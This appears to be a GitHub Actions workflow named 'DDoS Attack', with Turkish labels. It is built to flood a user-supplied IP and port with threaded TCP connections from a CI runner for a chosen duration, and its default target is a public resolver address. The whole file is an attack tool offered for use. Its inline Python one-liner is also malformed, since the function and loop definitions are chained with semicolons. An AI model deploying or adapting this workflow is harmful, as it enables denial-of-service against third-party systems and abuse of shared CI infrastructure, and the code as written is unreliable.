name: "DDoS Attack"
on:
  workflow_dispatch:
    inputs:
      ip:
        description: "Hedef IP"
        required: true
        default: "1.1.1.1"
      port:
        description: "Hedef Port"
        required: true
        default: "80"
      duration:
        description: "Süre (saniye)"
        required: true
        default: "30"

jobs:
  attack:
    runs-on: ubuntu-latest
    steps:
      - name: "Saldırıyı Başlat"
        run: "python3 -c \"import socket,threading,time;target='${{ github.event.inputs.ip }}';port=${{ github.event.inputs.port }};duration=${{ github.event.inputs.duration }};print('Hedef:',target,port);print('Süre:',duration,'saniye');count=0;def a():global count;end=time.time()+int(duration);while time.time()<end:try:s=socket.socket();s.settimeout(1);s.connect((target,int(port)));s.send(b'GET /');s.close();count+=1;except:pass;t=[threading.Thread(target=a) for _ in range(30)];[x.start() for x in t];[x.join() for x in t];print('Bitti. İstek:',count)\""
